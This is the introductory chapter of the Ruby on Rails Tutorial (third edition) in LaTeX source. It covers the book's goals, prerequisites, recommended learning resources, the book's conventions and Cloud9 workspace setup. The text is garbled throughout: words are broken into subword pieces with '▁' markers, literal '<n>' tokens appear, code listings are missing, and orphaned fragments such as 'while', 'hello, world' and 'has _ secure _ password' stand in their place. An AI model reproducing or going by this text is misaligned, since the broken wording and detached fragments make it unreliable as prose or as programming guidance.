▁The ▁purpose ▁of ▁this ▁book ▁is ▁to ▁teach ▁you ▁how ▁to ▁develop ▁custom ▁web ▁applications , ▁and ▁our ▁tool ▁of ▁choice ▁is ▁the ▁popular ▁\ href { http :// rubyonrails . org }{ Ruby ▁on ▁Rails } ▁web ▁framework .
▁Ruby ▁on ▁Rails ▁Tutorial
▁On ▁the ▁other ▁hand , ▁if ▁you ▁already ▁know ▁web ▁development , ▁this ▁book ▁will ▁quickly ▁teach ▁you ▁the ▁essential s ▁of ▁the ▁Rails ▁framework , ▁including ▁MVC ▁and ▁REST , ▁generator s , ▁migrations , ▁routing , ▁and ▁ embedded ▁Ruby .
▁In ▁either ▁case , ▁when ▁you ▁finish ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁you ▁will ▁be ▁in ▁a ▁position ▁to ▁benefit ▁from ▁the ▁many ▁more ▁advanced ▁book s , ▁blog s , ▁and ▁screencasts ▁that ▁are ▁part ▁of ▁the ▁thr i v ing ▁programming ▁ ed u c ation al ▁e co system
▁The ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁take s ▁an ▁integrat ed ▁approach ▁to ▁web ▁development ▁by ▁build ing ▁three ▁example ▁applications ▁of ▁increasing ▁sophistication , ▁starting ▁with ▁a ▁minimal ▁\ emph { hello } ▁app ▁( Section ~\ ref { sec : the _ hello _ application }), ▁a ▁slightly ▁more ▁capab le ▁\ emph { toy } ▁app ▁( Chapter ~\ ref { cha : a _ toy _ app }), ▁and ▁a ▁real ▁\ emph { sample } ▁app ▁( Chapter ~\ ref { cha : static _ pages } ▁through ▁Chapter ~\ ref { cha : following _ users }).
▁As ▁implie d ▁by ▁their ▁generic ▁names , ▁the ▁applications ▁ developed ▁in ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁are ▁not ▁specific ▁to ▁any ▁particular ▁kind ▁of ▁website ; ▁although ▁the ▁final ▁sample ▁application ▁will ▁be ar ▁more ▁than ▁a ▁passing ▁re s em b l ance ▁to ▁a ▁certain ▁popular ▁\ href { http :// twitter . com /}{ so cial ▁microblog g ing ▁site } ▁( a ▁site ▁which , ▁co in cidentally , ▁was ▁also ▁original ly ▁written ▁in ▁Rails ), ▁the ▁emphasi s ▁throughout ▁the ▁tutorial ▁is ▁on ▁general ▁principle s , ▁so ▁you ▁will ▁have ▁a ▁so li d ▁foundation ▁no ▁matter ▁what ▁kind s ▁of ▁web ▁applications ▁you ▁want ▁to ▁build .
▁One ▁common ▁question ▁is ▁how ▁much ▁background ▁is ▁necessary ▁to ▁learn ▁web ▁development ▁using ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial }.
▁As ▁discuss ed ▁in ▁more ▁depth ▁in ▁Section ~\ ref { sec : prerequisites }, ▁web ▁development ▁is ▁a ▁challenging ▁subject , ▁es pecially ▁for ▁complete ▁beginners .
▁A lthough ▁the ▁tutorial ▁was ▁original ly ▁design ed ▁for ▁readers ▁with ▁some ▁prior ▁programming ▁or ▁web - development ▁experience , ▁in ▁fact ▁it ▁has ▁found ▁a ▁significant ▁a udi ence ▁a mong ▁beginning ▁developers .
▁L o w er ing ▁the ▁bar r i er
▁This ▁third ▁edition ▁of ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁a i m s ▁to ▁lower ▁the ▁bar r i er ▁to ▁getting ▁started ▁with ▁Rails ▁in ▁a ▁number ▁of ▁ways :
▁Use ▁of ▁a ▁standard ▁development ▁environment ▁in ▁the ▁cloud ▁( Section ~\ ref { sec : up _ and _ running }), ▁which ▁side step s ▁many ▁of ▁the ▁problem s ▁ associated ▁with ▁install ing ▁and ▁ configuring ▁a ▁new ▁system
▁E li m in ation ▁of ▁many ▁external ▁dependencies ▁( R S p ec , ▁Cucumber , ▁Capybara , ▁ Factory ▁Girl )
▁A ▁light er - we ight ▁and ▁more ▁flexible ▁approach ▁to ▁testing
▁De f er r al ▁or ▁eliminat ion ▁of ▁more ▁complex ▁configuration ▁options ▁( S p or k , ▁Ruby Test )
▁L es s ▁emphasi s ▁on ▁features ▁specific ▁to ▁any ▁given ▁version ▁of ▁Rails , ▁with ▁greater ▁emphasi s ▁on ▁general ▁principle s ▁of ▁web ▁development
▁It ▁is ▁my ▁hope ▁that ▁these ▁changes ▁will ▁make ▁the ▁third ▁edition ▁of ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁accessible ▁to ▁an ▁even ▁broad er ▁a udi ence ▁than ▁previous ▁versions .
▁In ▁this ▁first ▁chapter , ▁we ' ll ▁get ▁started ▁with ▁Ruby ▁on ▁Rails ▁by ▁install ing ▁all ▁the ▁necessary ▁software ▁and ▁by ▁setting ▁up ▁our ▁development ▁environment ▁( Section ~\ ref { sec : up _ and _ running }).
▁We ' ll ▁the n ▁create ▁our ▁first ▁Rails ▁application , ▁called ▁\ k ode { hello \_ app }.
▁The ▁\ emph { Rails ▁Tutorial } ▁emphasize s ▁good ▁software ▁development ▁practice s , ▁so ▁immediately ▁after ▁creating ▁our ▁fresh ▁new ▁Rails ▁project ▁we ' ll ▁put ▁it ▁under ▁version ▁control ▁with ▁Git ▁( Section ~\ ref { sec : version _ control }).
▁And , ▁believe ▁it ▁or ▁not , ▁in ▁this ▁chapter ▁we ' ll ▁even ▁put ▁our ▁first ▁app ▁on ▁the ▁ wide r ▁web ▁by ▁\ emph { deploying } ▁it ▁to ▁production ▁( Section ~\ ref { sec : deploying }).
▁In ▁Chapter ~\ ref { cha : a _ toy _ app }, ▁we ' ll ▁make ▁a ▁second ▁project , ▁who se ▁purpose ▁is ▁to ▁demonstrate ▁the ▁basic ▁working s ▁of ▁a ▁Rails ▁application .
▁\ emph { U R I } ▁stand s ▁for ▁Un i form ▁Resource ▁I d ent if i er , ▁while ▁the ▁slightly ▁less ▁general ▁\ emph { URL } ▁stand s ▁for ▁Un i form ▁Resource ▁L o cat or .
▁In ▁practice , ▁the ▁URL ▁is ▁usually ▁equivalent ▁to ▁`` the ▁thing ▁you ▁see ▁in ▁the ▁address ▁bar ▁of ▁your ▁browser ''.
▁The ▁rest ▁of ▁the ▁tutorial ▁focus es ▁on ▁developing ▁a ▁single ▁large ▁\ emph { re al ▁sample ▁application } ▁( called ▁\ k ode { sample \_ app }), ▁writing ▁all ▁the ▁code ▁from ▁scratch .
▁We ' ll ▁develop ▁the ▁sample ▁app ▁using ▁a ▁combination ▁of ▁\ emph { mockup s }, ▁\ emph { test - driven ▁development } ▁( TDD ), ▁and ▁\ emph { integration ▁tests }.
▁We ' ll ▁get ▁started ▁in ▁Chapter ~\ ref { cha : static _ pages } ▁by ▁creating ▁static ▁pages ▁and ▁the n ▁add ▁a ▁little ▁dynamic ▁content .
▁We ' ll ▁take ▁a ▁quick ▁d et our ▁in ▁Chapter ~\ ref { cha : rails _ flavored _ ruby } ▁to ▁learn ▁a ▁little ▁about ▁the ▁Ruby ▁language ▁under ly ing ▁Rails .
▁Then , ▁in ▁Chapter ~\ ref { cha : filling _ in _ the _ layout } ▁through ▁Chapter ~\ ref { cha : account _ activation _ and _ password _ reset }, ▁we ' ll ▁complete ▁the ▁foundation ▁for ▁the ▁sample ▁application ▁by ▁making ▁a ▁site ▁layout , ▁a ▁user ▁data ▁model , ▁and ▁a ▁full ▁re g ist r ation ▁and ▁authentication ▁system ▁( including ▁account ▁activation ▁and ▁password ▁resets ).
▁F inally , ▁in ▁Chapter ~\ ref { cha : user _ microposts } ▁and ▁Chapter ~\ ref { cha : following _ users } ▁we ' ll ▁add ▁microblog g ing ▁and ▁so cial ▁features ▁to ▁make ▁a ▁working ▁example ▁site .
▁S ca f fold ing : ▁ Q u ic k er , ▁easier , ▁more ▁ s ed u c tive
▁ From ▁the ▁beginning , ▁Rails ▁has ▁benefit ed ▁from ▁a ▁p al p able ▁sense ▁of ▁ ex c item ent , ▁starting ▁with ▁the ▁f am ous ▁\ href { http :// www . y out u be . com / watch ? v = G z j 7 23 L k R J Y }{ 15 - minute ▁we blog ▁video } ▁by ▁Rails ▁c re at or ▁ David ▁H einemeier ▁Hansson .
▁That ▁video ▁and ▁its ▁ success or s ▁are ▁a ▁great ▁way ▁to ▁get ▁a ▁taste ▁of ▁Rails ' ▁power , ▁and ▁I ▁recommend ▁ watch ing ▁them .
▁But ▁be ▁ w ar n ed : ▁they ▁accomplish ▁their ▁a ma z ing ▁f if t e en - minute ▁f e at ▁using ▁a ▁feature ▁called ▁\ emph { scaffold ing }, ▁which ▁relie s ▁heav ily ▁on ▁\ emph { generated ▁code }, ▁magic ally ▁created ▁by ▁the ▁Rails ▁\ k ode { generate ▁scaffold } ▁command .
▁When ▁writing ▁a ▁Ruby ▁on ▁Rails ▁tutorial , ▁it ▁is ▁te mp ting ▁to ▁rely ▁on ▁the ▁scaffolding ▁approach --- it ' s ▁\ href { http :// en . wiki p edia . org / wiki / D ar k _ side _ ( S t ar _ W ar s )} { q u ic k er , ▁easier , ▁more ▁ s ed u c tive }.
▁But ▁the ▁complex ity ▁and ▁ s h e er ▁amount ▁of ▁code ▁in ▁the ▁scaffolding ▁can ▁be ▁ u tt er ly ▁over w hel m ing ▁to ▁a ▁beginning ▁Rails ▁developer ; ▁you ▁may ▁be ▁able ▁to ▁use ▁it , ▁but ▁you ▁ probably ▁won ' t ▁understand ▁it .
▁Follow ing ▁the ▁scaffolding ▁approach ▁risk s ▁turn ing ▁you ▁into ▁a ▁ v ir t u o so ▁ script ▁generator ▁with ▁little ▁( and ▁brittle ) ▁actual ▁ knowledg e ▁of ▁Rails .
▁In ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial }, ▁we ' ll ▁take ▁the ▁( nearly ) ▁p ol ar ▁oppos ite ▁approach : ▁although ▁Chapter ~\ ref { cha : a _ toy _ app } ▁will ▁develop ▁a ▁small ▁toy ▁app ▁using ▁scaffolding , ▁the ▁core ▁of ▁the ▁\ emph { Rails ▁Tutorial } ▁is ▁the ▁sample ▁app , ▁which ▁we ' ll ▁start ▁writing ▁in ▁Chapter ~\ ref { cha : static _ pages }.
▁At ▁each ▁stage ▁of ▁developing ▁the ▁sample ▁application , ▁we ▁will ▁write ▁\ emph { small , ▁bit e - size d } ▁pieces ▁of ▁code --- simple ▁enough ▁to ▁understand , ▁yet ▁no ve l ▁enough ▁to ▁be ▁challenging .
▁The ▁c um ul a tive ▁effect ▁will ▁be ▁a ▁ deep er , ▁more ▁flexible ▁ knowledg e ▁of ▁Rails , ▁giv ing ▁you ▁a ▁good ▁background ▁for ▁writing ▁ nearly ▁any ▁type ▁of ▁web ▁application .
▁< n >< n >\ end { aside }< n >< n >\ section { In tr o d u c t ion } ▁% ▁( fold )< n >\ label { sec : in tr o d u c t ion }< n >< n >
▁Ruby ▁on ▁Rails ▁( or ▁just ▁`` Rails '' ▁for ▁short ) ▁is ▁a ▁web ▁development ▁framework ▁written ▁in ▁the ▁Ruby ▁programming ▁language .
▁S ince ▁its ▁ de but ▁in ▁200 4 , ▁Ruby ▁on ▁Rails ▁has ▁ r api d ly ▁become ▁one ▁of ▁the ▁most ▁powerful ▁and ▁popular ▁tool s ▁for ▁build ing ▁dynamic ▁web ▁applications .
▁Rails ▁is ▁used ▁by ▁com p an ies ▁as ▁d ivers e ▁as ▁\ href { http :// a i rb n b . com /}{ A i rb n b }, ▁\ href { http :// base ca mp . com /}{ Base ca mp }, ▁\ href { http :// d is n e y . com /}{ D is n e y }, ▁\ href { http :// github . com /}{ GitHub }, ▁\ href { http :// h ul u . com /}{ H ul u }, ▁\ href { http :// k ic k start er . com /}{ K ic k start er }, ▁\ href { http :// s h o p ify . com /}{ S h o p ify }, ▁\ href { http :// twitter . com /}{ T w it ter }, ▁and ▁the ▁\ href { http :// y el low pages . com /}{ Y el low ▁Pages }.
▁There ▁are ▁also ▁many ▁web ▁development ▁sho p s ▁that ▁special ize ▁in ▁Rails , ▁such ▁as ▁\ href { http :// ent p . com /}{ E N T P }, ▁\ href { http :// thoughtbot . com /}{ thoughtbot }, ▁\ href { http :// p i v o t all abs . com /}{ P i v o t al ▁L abs }, ▁\ href { http :// h ashrocket . com /}{ H ashrocket }, ▁and ▁\ href { http :// www . h app y f un c or p . com /}{ H app y F un C or p }, ▁plus ▁in numerable ▁in dependent ▁consult ant s , ▁tr a in ers , ▁and ▁con tr ac to r s .
▁What ▁make s ▁Rails ▁so ▁great ?
▁Rails ▁also ▁ o we s ▁much ▁of ▁its ▁ success ▁to ▁its ▁elegant ▁and ▁compact ▁design ; ▁by ▁ exploit ing ▁the ▁m all e ability ▁of ▁the ▁under ly ing ▁\ href { http :// ruby - lang . org /}{ Ruby } ▁language , ▁Rails ▁effective ly ▁creates ▁a ▁\ href { http :// en . wiki p edia . org / wiki / Do main _ Specific _ L an g u age }{ domain - specific ▁language } ▁for ▁writing ▁web ▁applications . ▁As ▁a ▁result , ▁many ▁common ▁web ▁programming ▁task s --- such ▁as ▁ generating ▁HTML , ▁making ▁data ▁models , ▁and ▁routing ▁URLs --- a re ▁easy ▁with ▁Rails , ▁and ▁the ▁result ing ▁application ▁code ▁is ▁con ci se ▁and ▁read able .
▁Rails ▁also ▁ adapt s ▁ r api d ly ▁to ▁new ▁development s ▁in ▁web ▁ tech no log y ▁and ▁\ line break ▁framework ▁design .
▁For ▁example , ▁Rails ▁was ▁one ▁of ▁the ▁first ▁frameworks ▁to ▁fully ▁digest ▁and ▁implement ▁the ▁REST ▁architectur al ▁style ▁for ▁ str u c t ur ing ▁web ▁applications ▁( which ▁we ' ll ▁be ▁learning ▁about ▁throughout ▁this ▁tutorial ).
▁And ▁when ▁other ▁frameworks ▁develop ▁successful ▁new ▁technique s , ▁Rails ▁c re at or ▁\ href { http :// loud th in k ing . com /}{ David ▁H einemeier ▁Hansson } ▁and ▁the ▁\ href { http :// rubyonrails . org / core }{ Rails ▁core ▁team } ▁don ' t ▁he s it ate ▁to ▁incorporate ▁their ▁idea s .
▁P erhaps ▁the ▁most ▁d ra ma tic ▁example ▁is ▁the ▁merge r ▁of ▁Rails ▁and ▁M erb , ▁a ▁ r i v al ▁Ruby ▁web ▁framework , ▁so ▁that ▁Rails ▁now ▁benefit s ▁from ▁M erb ' s ▁ mod ul ar ▁design , ▁ s table ▁\ href { http :// en . wiki p edia . org / wiki / Application _ prog r am m ing _ interface }{ API }, ▁and ▁improve d ▁performance .
▁F inally , ▁Rails ▁benefit s ▁from ▁an ▁un us u ally ▁ ent h us i as tic ▁and ▁d ivers e ▁community .
▁The ▁results ▁include ▁h un d r ed s ▁of ▁open - source ▁\ href { http :// contributor s . rubyonrails . org /}{ contributor s }, ▁well - at t end ed ▁\ href { http :// rails co n f . com /}{ co n f er ence s }, ▁a ▁ huge ▁number ▁of ▁\ href { https :// rubygems . org /}{ gem s } ▁( self - contain ed ▁solution s ▁to ▁specific ▁problem s ▁such ▁as ▁pagination ▁and ▁image ▁upload ), ▁a ▁rich ▁variety ▁of ▁in format ive ▁blog s , ▁and ▁a ▁co r n u co p i a ▁of ▁discussion ▁for um s ▁and ▁I R C ▁ cha n n el s .
▁The ▁large ▁number ▁of ▁Rails ▁programmer s ▁also ▁make s ▁it ▁easier ▁to ▁handle ▁the ▁in evi table ▁application ▁errors : ▁the ▁`` G oo g le ▁the ▁error ▁message '' ▁algorithm ▁ nearly ▁always ▁produce s ▁a ▁relevant ▁blog ▁post ▁or ▁discussion - for um ▁thread .
▁That ▁said , ▁a ▁surpris ing ▁number ▁of ▁beginners ▁have ▁used ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁to ▁learn ▁web ▁development ▁from ▁scratch , ▁so ▁even ▁if ▁you ▁have ▁ limited ▁experience ▁I ▁suggest ▁giv ing ▁it ▁a ▁try .
▁If ▁you ▁feel ▁over w hel m ed , ▁you ▁can ▁always ▁go ▁back ▁and ▁start ▁with ▁one ▁of ▁the ▁resources ▁list ed ▁below .
▁A nother ▁strategy ▁recommended ▁by ▁multiple ▁readers ▁is ▁simply ▁to ▁do ▁the ▁tutorial ▁t w ic e ; ▁you ▁may ▁be ▁surpris ed ▁at ▁how ▁much ▁you ▁ learned ▁the ▁first ▁time ▁( and ▁how ▁much ▁easier ▁it ▁is ▁the ▁second ▁time ▁through ).
▁Co m m and
▁One ▁common ▁question ▁when ▁learning ▁Rails ▁is ▁whether ▁to ▁learn ▁Ruby ▁first .
▁The ▁an s w er ▁depend s ▁on ▁your ▁person al ▁learning ▁style ▁and ▁how ▁much ▁programming ▁experience ▁you ▁already ▁have .
▁If ▁you ▁prefer ▁to ▁learn ▁everything ▁system at ical ly ▁from ▁the ▁ ground ▁up , ▁or ▁if ▁you ▁have ▁ never ▁program m ed ▁before , ▁the n ▁learning ▁Ruby ▁first ▁m ight ▁work ▁well ▁for ▁you , ▁and ▁in ▁this ▁case ▁I ▁recommend ▁\ href { http :// p ra g prog . com / book / lt p 2 / learn - to - prog r am }{\ emph { Learn ▁to ▁ Pro gr am } } ▁by ▁C h r is ▁P ine ▁and ▁\ href { http :// www . a mazon . com / g p / product /1 4 3022 36 34 }{\ emph { B eginning ▁Ruby } } ▁by ▁P e ter ▁Co o p er .
▁On ▁the ▁other ▁hand , ▁many ▁beginning ▁Rails ▁developers ▁are ▁ ex c it ed ▁about ▁making ▁\ emph { web } ▁applications , ▁and ▁would ▁rather ▁not ▁wait ▁to ▁finish ▁a ▁whole ▁book ▁on ▁Ruby ▁before ▁ever ▁writing ▁a ▁single ▁web ▁page .
▁If ▁you ▁ still ▁find ▁this ▁tutorial ▁too ▁difficult , ▁you ▁m ight ▁try ▁starting ▁with ▁\ href { http :// learn - rails . com / learn - ruby - on - rails . html }{\ emph { Learn ▁Ruby ▁on ▁Rails } } ▁by ▁D an i el ▁ K e h o e ▁or ▁\ href { http :// m b s y . co / 7 Z d c 7 }{ O n e ▁Mon th ▁Rails }, ▁both ▁of ▁which ▁are ▁gear ed ▁more ▁toward ▁complete ▁beginners ▁than ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial }.
▁At ▁the ▁end ▁of ▁this ▁tutorial , ▁no ▁matter ▁where ▁you ▁started , ▁you ▁should ▁be ▁ready ▁for ▁the ▁many ▁more ▁in ter m edia t e - to - advance d ▁Rails ▁resources ▁out ▁there .
▁Here ▁are ▁some ▁I ▁particular ly ▁recommend :
▁\ href { http :// m b s y . co / 6 V Q 8 l }{ C ode ▁School } : ▁G ood ▁interactive ▁online ▁programming ▁course s
▁\ href { http :// www . go t ealeaf . com / railstutorial }{ T ealeaf ▁A ca de my } : ▁A ▁good ▁online ▁Rails ▁development ▁b oo t ca mp ▁( include s ▁advanced ▁material )
▁\ href { http :// www . th in k ful . com / a / railstutorial }{ T h in k ful } : ▁An ▁online ▁class ▁that ▁pair s ▁you ▁with ▁a ▁p rofessional ▁engine er ▁as ▁you ▁work ▁through ▁a ▁project - base d ▁c ur r ic ul um
▁\ href { https :// p ra g ma tic st udi o . com / ref s / railstutorial }{ P ra g ma tic ▁S t udi o } : ▁On line ▁Ruby ▁and ▁Rails ▁course s ▁from ▁M ike ▁and ▁N ic o le ▁C l ar k .
▁A long ▁with ▁\ emph { Programming ▁Ruby } ▁author ▁D a ve ▁Thomas , ▁M ike ▁t a ug h t ▁the ▁first ▁Rails ▁course ▁I ▁too k , ▁way ▁back ▁in ▁200 6 .
▁\ href { http :// r ailscasts . com /}{ RailsCast s } ▁by ▁ Ryan ▁B ate s : ▁ Ex ce ll ent ▁( most ly ▁free ) ▁Rails ▁screencasts
▁\ href { https :// tutorial s . rails app s . org / hartl }{ Rails A p p s } : ▁A ▁large ▁variety ▁of ▁ detailed ▁topic - specific ▁Rails ▁project s ▁and ▁tutorial s
▁\ href { http :// guides . rubyonrails . org /}{ Rails ▁G u id es } : ▁To p ical ▁and ▁up - to - date ▁Rails ▁reference s
▁The ▁convention s ▁in ▁this ▁book ▁are ▁most ly ▁self - ex p la n a tory .
▁In ▁this ▁section , ▁I ' ll ▁ ment ion ▁some ▁that ▁may ▁not ▁be .
▁M any ▁examples ▁in ▁this ▁book ▁use ▁command - line ▁commands .
▁For ▁simplicity , ▁all ▁command ▁line ▁examples ▁use ▁a ▁Unix - style ▁command ▁line ▁prompt ▁( a ▁do ll ar ▁sign ), ▁as ▁follows :
▁ hello , ▁world
▁As ▁mentioned ▁in ▁Section ~\ ref { sec : up _ and _ running }, ▁I ▁recommend ▁that ▁users ▁of ▁all ▁operat ing ▁systems ▁( es pecially ▁Windows ) ▁use ▁a ▁cloud ▁development ▁environment ▁( Section ~\ ref { sec : development _ environment }), ▁which ▁comes ▁with ▁a ▁built - in ▁Unix ▁( L in u x ) ▁command ▁line .
▁This ▁is ▁particular ly ▁useful ▁because ▁Rails ▁comes ▁with ▁many ▁commands ▁that ▁can ▁be ▁run ▁at ▁the ▁command ▁line .
▁For ▁example , ▁in ▁Section ~\ ref { sec : rails _ server } ▁we ' ll ▁run ▁a ▁local ▁development ▁web ▁server ▁with ▁the ▁\ k ode { rails ▁server } ▁command :
▁ $ ▁rails ▁server
▁As ▁with ▁the ▁command - line ▁prompt , ▁the ▁\ emph { Rails ▁Tutorial } ▁uses ▁the ▁Unix ▁convention ▁for ▁directory ▁ separator s ▁( i . e . , ▁a ▁forward ▁ slash ~\ k ode { / }).
▁For ▁example , ▁the ▁sample ▁application ▁\ k ode { production . rb } ▁configuration ▁file ▁appears ▁as ▁follows :
▁This ▁file ▁path ▁should ▁be ▁under st ood ▁as ▁being ▁relative ▁to ▁the ▁application ' s ▁root ▁directory , ▁which ▁will ▁var y ▁by ▁system ; ▁on ▁the ▁cloud ▁IDE ▁( Section ~\ ref { sec : development _ environment }), ▁it ▁look s ▁like ▁this :
▁/ home / u b un t u / workspace / sample _ app /
▁Thus , ▁the ▁full ▁path ▁to ▁\ k ode { production . rb } ▁is
▁The ▁\ emph { Rails ▁Tutorial } ▁often ▁shows ▁output ▁from ▁ various ▁program s ▁( s hel l ▁commands , ▁version ▁control ▁status , ▁Ruby ▁program s , ▁etc . ).
▁Because ▁of ▁the ▁in numerable ▁small ▁difference s ▁between ▁different ▁computer ▁systems , ▁the ▁output ▁you ▁see ▁may ▁not ▁always ▁a g re e ▁exactly ▁with ▁what ▁is ▁show n ▁in ▁the ▁text ,< n > but ▁this ▁is ▁not ▁cause ▁for ▁concern .
▁In ▁addition , ▁some ▁commands ▁may ▁produce ▁errors ▁depending ▁on ▁your ▁system ; ▁rather ▁than ▁attempt ▁the ▁\ href { http :// en . wiki p edia . org / wiki / S is y ph us }{ S is y ph e an } ▁task ▁of ▁document ing ▁all ▁such ▁errors ▁in ▁this ▁tutorial , ▁I ▁will ▁delegate ▁to ▁the ▁`` G oo g le ▁the ▁error ▁message '' ▁algorithm , ▁which ▁a mong ▁other ▁things ▁is ▁good ▁practice ▁for ▁real - life ▁software ▁development .
▁If ▁you ▁run ▁into ▁any ▁problem s ▁while ▁following ▁the ▁tutorial , ▁I ▁suggest ▁consult ing ▁the ▁resources ▁list ed ▁in ▁the ▁\ href { http :// www . railstutorial . org / # help }{ Rails ▁Tutorial ▁help ▁section }
▁Because ▁the ▁\ emph { Rails ▁Tutorial } ▁cover s ▁testing ▁of ▁Rails ▁applications , ▁it ▁is ▁often ▁helpful ▁to ▁know ▁if ▁a ▁particular ▁piece ▁of ▁code ▁cause s ▁the ▁test ▁suite ▁to ▁fail ▁( indicat ed ▁by ▁the ▁color ▁re d ) ▁or ▁pass ▁( indicat ed ▁by ▁the ▁color ▁green ).
▁while
▁ Each ▁chapter ▁in ▁the ▁tutorial ▁includes ▁ exercises , ▁the ▁com p let ion ▁of ▁which ▁is ▁optional ▁but ▁recommended .
▁In ▁order ▁to ▁keep ▁the ▁main ▁discussion ▁in dependent ▁of ▁the ▁ exercises , ▁the ▁solution s ▁are ▁not ▁generally ▁incorporate d ▁into ▁subsequent ▁code ▁list ing s .
▁In ▁the ▁rare ▁c ir c um st ance ▁that ▁an ▁exercise ▁solution ▁is ▁used ▁subsequent ly , ▁it ▁is ▁explicitly ▁solve d ▁in ▁the ▁main ▁text .
▁F inally , ▁for ▁convenience ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁a do p t s ▁two ▁convention s ▁design ed ▁to ▁make ▁the ▁many ▁code ▁sample s ▁easier ▁to ▁understand .
▁First , ▁some ▁code ▁list ing s ▁include ▁one ▁or ▁more ▁highlight ed ▁lines , ▁as ▁seen ▁below :
▁Such ▁highlight ed ▁lines ▁typical ly ▁indicate ▁the ▁most ▁important ▁new ▁code ▁in ▁the ▁given ▁sample , ▁and ▁often ▁( th ough ▁not ▁always ) ▁represent ▁the ▁difference ▁between ▁the ▁present ▁code ▁list ing ▁and ▁previous ▁list ing s .
▁S ec on d , ▁for ▁brevity ▁and ▁simplicity ▁many ▁of ▁the ▁book ' s ▁code ▁list ing s ▁include ▁vertical ▁do t s , ▁as ▁follows :
▁has _ secure _ password
▁These ▁do t s ▁represent ▁omitted ▁code ▁and ▁should ▁not ▁be ▁copie d ▁literal ly .
▁< n >< n > ▁% ▁section ▁introduction ▁( end )< n >< n > ▁\ section { U p ▁and ▁running } ▁% ▁( fold )< n > ▁\ label { sec : up _ and _ running }< n >< n >
▁Even ▁for ▁experience d ▁Rails ▁developers , ▁install ing ▁Ruby , ▁Rails , ▁and ▁all ▁the ▁ associated ▁support ing ▁software ▁can ▁be ▁an ▁exercise ▁in ▁f ru str ation .
▁Co mp ound ing ▁the ▁problem ▁is ▁the ▁ multi p li c ity ▁of ▁environments : ▁different ▁operat ing ▁systems , ▁version ▁number s , ▁p reference s ▁in ▁text ▁editor ▁and ▁integrat ed ▁development ▁environment ▁( ID E ), ▁etc .
▁The ▁cloud ▁IDE ▁run s ▁inside ▁an ▁ordinar y ▁web ▁browser ▁and ▁hence ▁works ▁the ▁same ▁across ▁different ▁platform s , ▁which ▁is ▁es pecially ▁useful ▁for ▁operat ing ▁systems ▁( such ▁as ▁Windows ) ▁on ▁which ▁Rails ▁development ▁has ▁his to r ical ly ▁been ▁difficult .
▁If , ▁desp ite ▁the ▁ cha ll en ge s ▁involve d , ▁you ▁would ▁ still ▁prefer ▁to ▁complete ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁using ▁a ▁local ▁development ▁environment , ▁I ▁recommend ▁following ▁the ▁instructions ▁at ▁\ href { http :// install rails . com /}{ In st all Rails . com }
▁Even ▁the n , ▁Windows ▁users ▁should ▁be ▁ w ar n ed ▁that ▁the ▁Rails ▁install er ▁recommended ▁by ▁In st all Rails ▁is ▁often ▁out ▁of ▁date , ▁and ▁is ▁likely ▁to ▁be ▁in com p at i b le ▁with ▁the ▁present ▁tutorial .
▁Consider ing ▁ various ▁id io s y n c ra tic ▁customizations , ▁there ▁are ▁ probably ▁as ▁many ▁development ▁environments ▁as ▁there ▁are ▁Rails ▁programmer s .
▁To ▁avoid ▁this ▁complex ity , ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁standard ize s ▁on ▁the ▁excellent ▁cloud ▁development ▁environment ▁\ href { http :// c 9 . io /}{ C loud 9 }.
▁In ▁particular , ▁for ▁this ▁third ▁edition ▁I ▁a m ▁please d ▁to ▁part n er ▁with ▁C loud 9 ▁to ▁offer ▁a ▁development ▁environment ▁specifically ▁tailor ed ▁to ▁the ▁needs ▁of ▁this ▁tutorial .
▁The ▁result ing ▁Rails ▁Tutorial ▁C loud 9 ▁ workspace ▁comes ▁pre - config ur ed ▁with ▁most ▁of ▁the ▁software ▁needed ▁for ▁p rofessional - grade ▁Rails ▁development , ▁including ▁Ruby , ▁RubyGems , ▁Git .
▁( In de ed , ▁the ▁only ▁big ▁piece ▁of ▁software ▁we ' ll ▁install ▁separate ly ▁is ▁Rails ▁itself , ▁and ▁this ▁is ▁in t ent ion al ▁( Section ~\ ref { sec : install ing _ rails }).)
▁The ▁cloud ▁IDE ▁also ▁includes ▁the ▁three ▁essential ▁components ▁needed ▁to ▁develop ▁web ▁applications : ▁a ▁text ▁editor , ▁a ▁file system ▁navigat or , ▁and ▁a ▁command - line ▁terminal ▁( F igure ~\ ref { fig : id e _ an a to my }).
▁A mong ▁other ▁features , ▁the ▁cloud ▁IDE ▁text ▁editor ▁supports ▁the ▁`` F in d ▁in ▁File s '' ▁g lo b al ▁search ▁that ▁I ▁consider ▁essential ▁to ▁navigat ing ▁any ▁large ▁Ruby ▁or ▁Rails ▁project
▁For ▁example , ▁to ▁find ▁the ▁definition ▁of ▁a ▁function ▁called ▁\ k ode { foo }, ▁you ▁can ▁do ▁a ▁g lo b al ▁search ▁for ▁`` de f ▁ foo ''.
▁F inally , ▁even ▁if ▁you ▁decide ▁not ▁to ▁use ▁the ▁cloud ▁IDE ▁excl us ive ly ▁in ▁real ▁life ▁( and ▁I ▁certain ly ▁recommend ▁learning ▁other ▁tool s ▁as ▁well ), ▁it ▁provides ▁an ▁excellent ▁introduction ▁to ▁the ▁general ▁capabilities ▁of ▁text ▁editor s ▁and ▁other ▁development ▁tool s .
▁Here ▁are ▁the ▁steps ▁for ▁getting ▁started ▁with ▁the ▁cloud ▁development ▁environment :
▁Click ▁on ▁`` G o ▁to ▁your ▁D as h board ''
▁S el ec t ▁`` Create ▁ New ▁Work space ''
▁As ▁show n ▁in ▁F igure ~\ ref { fig : cloud 9 _ new _ workspace }, ▁create ▁a ▁ workspace ▁called ▁`` rails - tutorial '' ▁(\ emph { not } ▁`` rails \_ tutorial '') , ▁set ▁it ▁to ▁`` P r i v ate ▁to ▁the ▁people ▁I ▁in v ite '' , ▁and ▁select ▁the ▁icon ▁for ▁the ▁Rails ▁Tutorial ▁(\ emph { not } ▁the ▁icon ▁for ▁Ruby ▁on ▁Rails )
▁Click ▁`` Create ''
